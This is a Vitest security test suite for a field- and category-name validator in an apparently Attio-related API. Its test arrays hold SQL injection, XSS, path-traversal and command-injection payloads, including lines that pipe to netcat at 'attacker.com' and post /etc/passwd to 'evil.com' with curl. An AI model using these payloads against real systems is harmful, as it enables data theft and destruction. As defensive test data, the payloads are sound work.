/**
 * Comprehensive Security Tests for Issue #414 API Contract Violations
 *
 * This test suite focuses specifically on security vulnerabilities and attack vectors
 * identified in Issue #414, providing thorough coverage of:
 * - Field parameter injection attacks
 * - Category parameter injection attacks
 * - Input sanitization and validation
 * - DoS protection mechanisms
 * - Boundary condition testing
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import {
  validateFieldName,
  validateFieldNames,
  secureValidateFields,
  validateCategoryName,
  validateCategoryNames,
  secureValidateCategories,
  sanitizeFieldName,
} from '../../src/utils/validation/field-validation.js';
import { ResourceType } from '../../src/types/attio.js';
import { UniversalValidationError } from '../../src/handlers/tool-configs/universal/schemas.js';

describe('Issue #414: Security Validation Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('CRITICAL: Field Parameter Injection Security', () => {
    describe('SQL Injection Attack Prevention', () => {
      it('should reject SQL injection attempts in field names', () => {
        const sqlInjectionAttempts = [
          "'; DROP TABLE users; --",
          '" OR 1=1; --',
          'field; DELETE FROM records WHERE 1=1; --',
          "field'; UPDATE records SET deleted=true; --",
          'field" UNION SELECT password FROM users --',
          "field' AND SLEEP(10) --",
          'field" OR "1"="1',
          'field\\"; DROP DATABASE attio; --',
        ];

        sqlInjectionAttempts.forEach((maliciousField) => {
          const result = validateFieldName(maliciousField, ResourceType.PEOPLE);
          expect(result.valid).toBe(false);
          expect(result.error).toMatch(/dangerous characters/i);
          expect(result.warnings).toContain('Potential security risk detected');
        });
      });

      it('should sanitize potentially dangerous SQL patterns', () => {
        const dangerousPatterns = [
          { input: 'field_name; SELECT *', expected: 'field_name__SELECT_' },
          { input: 'user"password', expected: 'userpassword' },
          { input: "field'injection", expected: 'fieldinjection' },
          { input: 'field--comment', expected: 'fieldcomment' },
        ];

        dangerousPatterns.forEach(({ input, expected }) => {
          const sanitized = sanitizeFieldName(input, { maxLength: 50 });
          expect(sanitized).toBe(expected);
          expect(sanitized).not.toMatch(/['"`;]/);
        });
      });
    });

    describe('Script Injection Attack Prevention', () => {
      it('should reject script injection attempts in field names', () => {
        const scriptInjectionAttempts = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          'onclick="alert(1)"',
          'onload=alert(1)',
          'onfocus="malicious()"',
          '<img src=x onerror=alert(1)>',
          '<svg onload=alert(1)>',
          '<iframe src="javascript:alert(1)"></iframe>',
        ];

        scriptInjectionAttempts.forEach((maliciousField) => {
          const result = validateFieldName(maliciousField, ResourceType.PEOPLE);
          expect(result.valid).toBe(false);
          expect(result.error).toMatch(/dangerous characters/i);
        });
      });

      it('should sanitize script-like patterns completely', () => {
        const scriptPatterns = [
          {
            input: '<script>field</script>',
            expected: 'field_scriptfield_script',
          },
          {
            input: 'javascript:field_name',
            expected: 'field_javascriptfield_name',
          },
          { input: 'onclick=field', expected: 'field_onclickfield' },
        ];

        scriptPatterns.forEach(({ input, expected }) => {
          const sanitized = sanitizeFieldName(input, { maxLength: 50 });
          expect(sanitized).toBe(expected);
          expect(sanitized).not.toMatch(/<|>|:/);
        });
      });
    });

    describe('Path Traversal Attack Prevention', () => {
      it('should reject path traversal attempts in field names', () => {
        const pathTraversalAttempts = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32',
          '/etc/shadow',
          '..\\admin\\config',
          '../database/users.db',
          '../../secrets/api_keys.txt',
          '/proc/self/environ',
          '..\\..\\..\\boot.ini',
        ];

        pathTraversalAttempts.forEach((maliciousField) => {
          const result = validateFieldName(maliciousField, ResourceType.PEOPLE);
          expect(result.valid).toBe(false);
          expect(result.error).toMatch(/dangerous characters/i);
        });
      });
    });

    describe('Command Injection Attack Prevention', () => {
      it('should reject command injection attempts in field names', () => {
        const commandInjectionAttempts = [
          'field; rm -rf /',
          'field && cat /etc/passwd',
          'field | nc attacker.com 4444',
          'field `whoami`',
          'field $(id)',
          'field & ping attacker.com',
          'field || curl evil.com',
          'field; curl -X POST http://evil.com --data @/etc/passwd',
        ];

        commandInjectionAttempts.forEach((maliciousField) => {
          const result = validateFieldName(maliciousField, ResourceType.PEOPLE);
          expect(result.valid).toBe(false);
          expect(result.error).toMatch(/dangerous characters/i);
        });
      });
    });

    describe('Control Character Attack Prevention', () => {
      it('should reject control characters in field names', () => {
        const controlCharacterAttempts = [
          'field\x00null',
          'field\x01control',
          'field\x02text',
          'field\x7fdelete',
          'field\n\rinjection',
          'field\t\ttab',
          'field\v\vvertical',
          'field\f\fform',
        ];

        controlCharacterAttempts.forEach((maliciousField) => {
          const result = validateFieldName(maliciousField, ResourceType.PEOPLE);
          expect(result.valid).toBe(false);
          expect(result.error).toMatch(/dangerous characters/i);
        });
      });
    });
  });

  describe('CRITICAL: Category Parameter Injection Security', () => {
    describe('Category SQL Injection Prevention', () => {
      it('should reject SQL injection in category names', () => {
        const maliciousCategories = [
          "basic'; DROP TABLE categories; --",
          'business" OR 1=1 --',
          "extended'; DELETE FROM attributes; --",
          'basic\\"; UPDATE categories SET deleted=true; --',
        ];

        maliciousCategories.forEach((category) => {
          const result = validateCategoryName(category);
          expect(result.valid).toBe(false);
          expect(result.error).toMatch(/dangerous characters/i);
          expect(result.warnings).toContain('Potential security risk detected');
        });
      });
    });

    describe('Category Script Injection Prevention', () => {
      it('should reject script injection in category names', () => {
        const maliciousCategories = [
          '<script>alert("category")</script>',
          'javascript:malicious()',
          'onclick="steal_data()"',
          '<img src=x onerror="send_cookies()">',
        ];

        maliciousCategories.forEach((category) => {
          const result = validateCategoryName(category);
          expect(result.valid).toBe(false);
          expect(result.error).toMatch(/dangerous characters/i);
        });
      });
    });

    describe('Multiple Category Security Validation', () => {
      it('should validate category arrays for bulk injection attempts', () => {
        const result = validateCategoryNames([
          'basic',
          '; DROP TABLE users; --',
          'business',
          '<script>alert(1)</script>',
          'extended',
        ]);

        expect(result.valid).toBe(false);
        expect(result.errors).toHaveLength(2);
        expect(result.sanitizedCategories).toEqual([
          'basic',
          'business',
          'extended',
        ]);
      });
    });
  });

  describe('CRITICAL: DoS Protection and Rate Limiting', () => {
    describe('Field Array DoS Protection', () => {
      it('should reject excessively large field arrays', () => {
        const massiveFieldArray = Array.from(
          { length: 1000 },
          (_, i) => `field_${i}`
        );

        expect(() => {
          secureValidateFields(
            massiveFieldArray,
            ResourceType.PEOPLE,
            'DoS test'
          );
        }).toThrow(UniversalValidationError);

        try {
          secureValidateFields(
            massiveFieldArray,
            ResourceType.PEOPLE,
            'DoS test'
          );
        } catch (error) {
          expect(error.message).toMatch(/Too many fields.*maximum.*50/);
        }
      });

      it('should handle reasonable field arrays without issues', () => {
        const reasonableFieldArray = [
          'name',
          'email_addresses',
          'phone_numbers',
        ];

        expect(() => {
          const result = secureValidateFields(
            reasonableFieldArray,
            ResourceType.PEOPLE
          );
          expect(result).toEqual(reasonableFieldArray);
        }).not.toThrow();
      });

      it('should measure performance impact of large valid field arrays', () => {
        const largeValidArray = Array.from({ length: 49 }, (_, i) => 'name'); // Just under limit

        const startTime = performance.now();
        const result = secureValidateFields(
          largeValidArray,
          ResourceType.PEOPLE
        );
        const endTime = performance.now();

        expect(result).toBeDefined();
        expect(endTime - startTime).toBeLessThan(100); // Should complete in <100ms
      });
    });

    describe('Category Array DoS Protection', () => {
      it('should reject excessively large category arrays', () => {
        const massiveCategoryArray = Array.from({ length: 50 }, () => 'basic');

        expect(() => {
          secureValidateCategories(massiveCategoryArray, 'DoS test');
        }).toThrow(UniversalValidationError);

        try {
          secureValidateCategories(massiveCategoryArray, 'DoS test');
        } catch (error) {
          expect(error.message).toMatch(/Too many categories.*maximum.*10/);
        }
      });
    });

    describe('Field Name Length DoS Protection', () => {
      it('should reject extremely long field names', () => {
        const extremelyLongFieldName = 'a'.repeat(1000);

        const result = validateFieldName(
          extremelyLongFieldName,
          ResourceType.PEOPLE
        );
        expect(result.valid).toBe(true); // Sanitization will truncate
        expect(result.sanitized!.length).toBeLessThanOrEqual(50);
        expect(result.warnings).toContain(
          expect.stringMatching(/was sanitized/)
        );
      });

      it('should handle buffer overflow attempts', () => {
        const bufferOverflowAttempt = 'A'.repeat(100000); // 100KB

        const startTime = performance.now();
        const result = validateFieldName(
          bufferOverflowAttempt,
          ResourceType.PEOPLE
        );
        const endTime = performance.now();

        expect(result.valid).toBe(true);
        expect(result.sanitized!.length).toBeLessThanOrEqual(50);
        expect(endTime - startTime).toBeLessThan(10); // Should handle quickly
      });
    });
  });

  describe('CRITICAL: Input Type Safety and Validation', () => {
    describe('Non-String Field Input Handling', () => {
      it('should handle null and undefined field inputs safely', () => {
        expect(() => {
          secureValidateFields(null as any, ResourceType.PEOPLE);
        }).toThrow(UniversalValidationError);

        expect(() => {
          secureValidateFields(undefined as any, ResourceType.PEOPLE);
        }).toThrow(UniversalValidationError);
      });

      it('should handle non-array field inputs safely', () => {
        const nonArrayInputs = [
          'single_field',
          123,
          { field: 'object' },
          true,
          Symbol('test'),
        ];

        nonArrayInputs.forEach((input) => {
          expect(() => {
            secureValidateFields(input as any, ResourceType.PEOPLE);
          }).toThrow(UniversalValidationError);
        });
      });
    });

    describe('Mixed Type Array Handling', () => {
      it('should handle arrays with mixed types safely', () => {
        const mixedArray = [
          'valid_field',
          null,
          123,
          { malicious: 'object' },
          undefined,
          ['nested', 'array'],
          Symbol('symbol'),
          () => 'function',
        ];

        expect(() => {
          secureValidateFields(mixedArray as any, ResourceType.PEOPLE);
        }).toThrow(); // Should fail validation for non-string types
      });
    });

    describe('Resource Type Validation', () => {
      it('should validate fields against correct resource type', () => {
        const peopleFields = ['first_name', 'last_name', 'email_addresses'];
        const companyFields = ['industry', 'revenue', 'headquarters'];

        // Valid for people
        expect(() => {
          secureValidateFields(peopleFields, ResourceType.PEOPLE);
        }).not.toThrow();

        // Company fields should have warnings for people resource
        const result = validateFieldNames(companyFields, ResourceType.PEOPLE);
        expect(result.warnings.length).toBeGreaterThan(0);
      });
    });
  });

  describe('CRITICAL: Error Message Security', () => {
    describe('Information Disclosure Prevention', () => {
      it('should not expose sensitive system information in error messages', () => {
        const maliciousField = '; DROP TABLE users; --';

        const result = validateFieldName(maliciousField, ResourceType.PEOPLE);
        expect(result.error).not.toMatch(
          /database|table|sql|system|server|config/i
        );
        expect(result.error).toContain('dangerous characters');
        expect(result.error).toContain(maliciousField); // Should show the input for debugging
      });

      it('should provide safe error messages for legitimate users', () => {
        const typoField = 'email_addres'; // Missing 's'

        const result = validateFieldName(typoField, ResourceType.PEOPLE);
        expect(result.valid).toBe(true);
        expect(result.warnings).toContain(
          expect.stringMatching(/Did you mean.*email_addresses/)
        );
      });
    });

    describe('Consistent Error Structure', () => {
      it('should provide consistent error structure for security violations', () => {
        const securityViolations = [
          '; DROP TABLE users; --',
          '<script>alert(1)</script>',
          '../../../etc/passwd',
          'field && rm -rf /',
          'field\x00null',
        ];

        securityViolations.forEach((violation) => {
          const result = validateFieldName(violation, ResourceType.PEOPLE);
          expect(result).toMatchObject({
            valid: false,
            error: expect.stringContaining('dangerous characters'),
            warnings: expect.arrayContaining([
              expect.stringMatching(/security risk/i),
            ]),
          });
        });
      });
    });
  });

  describe('EDGE CASES: Boundary Testing', () => {
    describe('Field Name Edge Cases', () => {
      it('should handle empty and whitespace-only field names', () => {
        const edgeCases = ['', '   ', '\t\n\r', null, undefined];

        edgeCases.forEach((edgeCase) => {
          const result = validateFieldName(
            edgeCase as any,
            ResourceType.PEOPLE
          );
          expect(result.valid).toBe(false);
          expect(result.error).toMatch(/non-empty string/);
        });
      });

      it('should handle unicode and international characters', () => {
        const unicodeFields = [
          'field_名前', // Japanese
          'field_ñame', // Spanish
          'field_ëmail', // French
          'field_naïve', // French
          'поле_имя', // Cyrillic
          'field_😀emoji', // Emoji
          'field_🔒secure', // Security emoji
        ];

        unicodeFields.forEach((field) => {
          const result = validateFieldName(field, ResourceType.PEOPLE);
          // Should be sanitized but not cause security errors
          expect(result.valid).toBe(true);
          expect(result.sanitized).toBeDefined();
          expect(result.sanitized).not.toMatch(/[^\w]/); // Should be sanitized to word chars
        });
      });
    });

    describe('Resource Type Edge Cases', () => {
      it('should handle unknown resource types gracefully', () => {
        const unknownResourceType = 'UNKNOWN_RESOURCE' as ResourceType;

        const result = validateFieldNames(['name'], unknownResourceType);
        expect(result.valid).toBe(true); // Should fall back to common safe fields
        expect(result.sanitizedFields).toEqual(['name']);
      });
    });

    describe('Performance Edge Cases', () => {
      it('should handle rapid sequential validation calls', () => {
        const rapidCalls = Array.from({ length: 100 }, (_, i) => `field_${i}`);

        const startTime = performance.now();
        rapidCalls.forEach((field) => {
          validateFieldName(field, ResourceType.PEOPLE);
        });
        const endTime = performance.now();

        expect(endTime - startTime).toBeLessThan(100); // Should be very fast
      });

      it('should handle concurrent validation without memory issues', async () => {
        const concurrentPromises = Array.from({ length: 50 }, (_, i) =>
          Promise.resolve(
            validateFieldName(`concurrent_field_${i}`, ResourceType.PEOPLE)
          )
        );

        const results = await Promise.all(concurrentPromises);

        expect(results).toHaveLength(50);
        results.forEach((result, i) => {
          expect(result.valid).toBe(true);
          expect(result.sanitized).toBe(`concurrent_field_${i}`);
        });
      });
    });
  });

  describe('INTEGRATION: Real-World Attack Simulations', () => {
    describe('Multi-Vector Attack Simulation', () => {
      it('should handle combined attack vectors in single request', () => {
        const multiVectorAttack = [
          'normal_field',
          '; DROP TABLE users; --', // SQL injection
          '<script>alert(1)</script>', // XSS
          '../../../etc/passwd', // Path traversal
          'field && curl evil.com', // Command injection
          'field\x00null', // Null byte injection
          'A'.repeat(1000), // Buffer overflow attempt
          'normal_field_2',
        ];

        const result = validateFieldNames(
          multiVectorAttack,
          ResourceType.PEOPLE
        );

        // Should reject dangerous patterns but keep safe ones
        expect(result.valid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
        expect(result.sanitizedFields).toContain('normal_field');
        expect(result.sanitizedFields).toContain('normal_field_2');
        expect(result.sanitizedFields).not.toContain(
          expect.stringContaining('DROP')
        );
        expect(result.sanitizedFields).not.toContain(
          expect.stringContaining('<script>')
        );
      });
    });

    describe('Bypass Attempt Detection', () => {
      it('should detect common bypass techniques', () => {
        const bypassAttempts = [
          'field%27%20OR%201%3D1', // URL encoded SQL injection
          'field\u0027 OR 1=1', // Unicode escape
          'field\x27 OR 1=1', // Hex escape
          "FIELD' OR 1=1", // Case variation
          "field' /*comment*/ OR 1=1", // SQL comment bypass
          "field'+OR+1=1--", // Plus encoding
          'field&#39; OR 1=1', // HTML entity encoding
        ];

        bypassAttempts.forEach((attempt) => {
          const result = validateFieldName(attempt, ResourceType.PEOPLE);
          // Should either be rejected (invalid) or properly sanitized
          if (result.valid && result.sanitized) {
            // If accepted, should be properly sanitized
            expect(result.sanitized).not.toMatch(
              /OR.*1.*1|DROP|SELECT|UPDATE|DELETE/i
            );
          } else {
            // Should be rejected for security reasons
            expect(result.valid).toBe(false);
          }
        });
      });
    });
  });
});
